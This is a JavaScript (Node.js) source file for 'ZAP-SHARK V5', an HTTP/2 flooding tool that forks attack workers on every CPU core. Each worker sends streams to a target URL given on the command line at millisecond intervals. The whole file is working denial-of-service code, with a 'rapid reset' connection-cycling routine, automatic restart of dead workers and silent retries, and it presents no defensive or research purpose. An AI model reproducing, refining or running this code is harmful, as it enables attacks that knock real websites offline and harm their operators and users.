const http2 = require('http2');
const os = require('os');
const cluster = require('cluster');
const { exec } = require('child_process');

// ==================== MASTER PROCESS ====================
if (cluster.isMaster) {
    console.log('=== ZAP-SHARK V5 - MULTI-PROCESS CLUSTER ===');
    console.log('Target:', process.argv[2] || 'https://target.com');
    console.log('CPU Cores:', os.cpus().length);
    console.log('='.repeat(60));
    
    // BYPASS JS MEMORY LIMITS (NO ROOT NEEDED)
    process.env.UV_THREADPOOL_SIZE = 128;
    process.setMaxListeners(0);
    
    // CREATE WORKER FOR EACH CPU CORE
    const numWorkers = Math.max(4, os.cpus().length);
    console.log(`[+] Launching ${numWorkers} attack workers`);
    
    // SHARED MEMORY FOR STATS
    const sharedStats = {
        totalRequests: 0,
        currentRPS: 0,
        peakRPS: 0,
        startTime: Date.now(),
        activeWorkers: 0
    };
    
    // CREATE WORKERS
    for (let i = 0; i < numWorkers; i++) {
        setTimeout(() => {
            const worker = cluster.fork({
                WORKER_ID: i,
                TARGET_URL: process.argv[2]
            });
            
            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    sharedStats.totalRequests += msg.requests;
                    sharedStats.currentRPS += msg.rps;
                    sharedStats.peakRPS = Math.max(sharedStats.peakRPS, sharedStats.currentRPS);
                    sharedStats.activeWorkers++;
                }
            });
        }, i * 100); // Stagger worker starts
    }
    
    // DISPLAY CONTROLLER
    let lastDisplayUpdate = Date.now();
    const displayInterval = setInterval(() => {
        const runtime = Math.floor((Date.now() - sharedStats.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const workersAlive = Object.keys(cluster.workers || {}).length;
        const memoryUsed = Math.round(process.memoryUsage().rss / 1024 / 1024);
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK V5 MASTER ===`);
        console.log(`RUNTIME: ${runtimeStr} | WORKERS: ${workersAlive}/${numWorkers} | MEM: ${memoryUsed}MB`);
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${sharedStats.totalRequests.toLocaleString()}`);
        console.log(`COMBINED RPS: ${sharedStats.currentRPS.toFixed(1)} | PEAK: ${sharedStats.peakRPS.toFixed(1)}`);
        console.log(`REQ/SEC PER WORKER: ${(sharedStats.currentRPS / workersAlive || 1).toFixed(1)}`);
        console.log('='.repeat(60));
        console.log('WORKER STATUS:');
        
        // Reset for next calculation
        sharedStats.currentRPS = 0;
        sharedStats.activeWorkers = 0;
        
        lastDisplayUpdate = Date.now();
    }, 1000);
    
    // AUTO-RESTART DEAD WORKERS
    cluster.on('exit', (worker, code, signal) => {
        console.log(`[!] Worker ${worker.id} died, restarting...`);
        setTimeout(() => {
            const newWorker = cluster.fork({
                WORKER_ID: worker.id,
                TARGET_URL: process.argv[2]
            });
        }, 1000);
    });
    
    // CLEANUP ON EXIT
    process.on('SIGINT', () => {
        clearInterval(displayInterval);
        console.log('\n\n=== FINAL CLUSTER STATS ===');
        console.log(`Total Requests: ${sharedStats.totalRequests.toLocaleString()}`);
        console.log(`Peak Combined RPS: ${sharedStats.peakRPS.toFixed(1)}`);
        console.log(`Runtime: ${Math.floor((Date.now() - sharedStats.startTime) / 1000)}s`);
        console.log('='.repeat(40));
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    });
    
} else {
// ==================== WORKER PROCESS ====================
const WORKER_ID = parseInt(process.env.WORKER_ID);
const TARGET_URL = process.env.TARGET_URL || 'https://example.com';

class V5Worker {
    constructor() {
        this.targetUrl = TARGET_URL;
        this.hostname = new URL(TARGET_URL).hostname;
        this.workerId = WORKER_ID;
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // VIP RAPID RESET - 500ms
        this.connectionPool = [];
        this.maxConnections = 8;
        this.lastConnectionReset = Date.now();
        this.resetInterval = 500; // VIP 500ms RAPID RESET
        
        // MEMORY BYPASS TECHNIQUES
        this.preAllocatedRequests = 1000;
        this.requestBuffer = [];
        this.zeroMemoryMode = true;
        
        // WORKER-SPECIFIC PAYLOAD
        this.payloadSignature = `SHARK-V5-W${this.workerId}-${Date.now()}`;
        
        this.init();
    }
    
    init() {
        console.log(`[Worker ${this.workerId}] Initializing attack...`);
        
        // PRE-ALLOCATE REQUEST OBJECTS (MEMORY BYPASS)
        for (let i = 0; i < this.preAllocatedRequests; i++) {
            this.requestBuffer.push({
                headers: {
                    ':method': 'GET',
                    ':path': `/?w=${this.workerId}&t=${Date.now()}`,
                    ':authority': this.hostname,
                    'user-agent': `ZAP-SHARK-V5/${this.workerId}`,
                    'x-shark-id': this.payloadSignature
                }
            });
        }
        
        // BUILD CONNECTION POOL
        this.buildConnectionPool();
        
        // START ATTACK
        setTimeout(() => this.startAttack(), 1000);
        
        // START STATS REPORTING
        setInterval(() => this.reportStats(), 1000);
    }
    
    // BUILD OPTIMIZED CONNECTION POOL
    buildConnectionPool() {
        for (let i = 0; i < this.maxConnections; i++) {
            this.createConnection();
        }
    }
    
    createConnection() {
        try {
            // ULTRA-LIGHT H2 CONNECTION
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 8192, // MINIMAL MEMORY
                maxDeflateDynamicTableSize: 4096
            });
            
            // MINIMAL EVENT LISTENERS
            client.on('error', () => {
                setTimeout(() => this.createConnection(), 100);
            });
            
            this.connectionPool.push({
                client,
                created: Date.now(),
                requestCount: 0,
                id: Math.random().toString(36).substr(2, 5)
            });
            
        } catch (err) {
            // SILENT RETRY
        }
    }
    
    // VIP RAPID RESET - 500ms
    performRapidReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            // RESET 40% OF CONNECTIONS EVERY 500ms
            const resetCount = Math.ceil(this.connectionPool.length * 0.4);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                const conn = this.connectionPool[index];
                
                if (conn && conn.requestCount > 1000) {
                    try {
                        conn.client.destroy();
                        this.createConnection();
                        this.connectionPool.splice(index, 1);
                    } catch (err) {}
                }
            }
            
            this.lastConnectionReset = now;
        }
    }
    
    // MEMORY-EFFICIENT REQUEST SENDING
    sendRequest() {
        if (this.connectionPool.length === 0) return;
        
        // USE PRE-ALLOCATED REQUEST OBJECTS
        const reqTemplate = this.requestBuffer[
            Math.floor(Math.random() * this.requestBuffer.length)
        ];
        
        // SEND MULTIPLE STREAMS PER TICK
        const streamsThisTick = Math.min(20, this.connectionPool.length * 2);
        
        for (let i = 0; i < streamsThisTick; i++) {
            const conn = this.connectionPool[
                Math.floor(Math.random() * this.connectionPool.length)
            ];
            if (!conn) continue;
            
            try {
                const req = conn.client.request(reqTemplate.headers);
                conn.requestCount++;
                
                // ZERO-MEMORY RESPONSE HANDLING
                req.on('response', () => {
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
        
        // PERFORM VIP RAPID RESET
        this.performRapidReset();
    }
    
    // ATTACK LOOP
    startAttack() {
        // ULTRA-FAST LOOP WITH MEMORY BYPASS
        setInterval(() => {
            // SEND 5 BATCHES PER TICK
            for (let i = 0; i < 5; i++) {
                this.sendRequest();
            }
            
            // CALCULATE RPS
            const now = Date.now();
            const timeDiff = (now - this.lastRpsCalc) / 1000;
            
            if (timeDiff >= 0.9) {
                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
                this.requestsSinceLastCalc = 0;
                this.lastRpsCalc = now;
            }
            
        }, 1); // 1ms INTERVAL FOR MAX SPEED
    }
    
    // REPORT TO MASTER
    reportStats() {
        if (process.send) {
            process.send({
                type: 'stats',
                workerId: this.workerId,
                requests: this.totalRequests,
                rps: this.currentRPS,
                connections: this.connectionPool.length,
                memory: Math.round(process.memoryUsage().heapUsed / 1024 / 1024)
            });
        }
    }
}

// START WORKER
new V5Worker();
            }
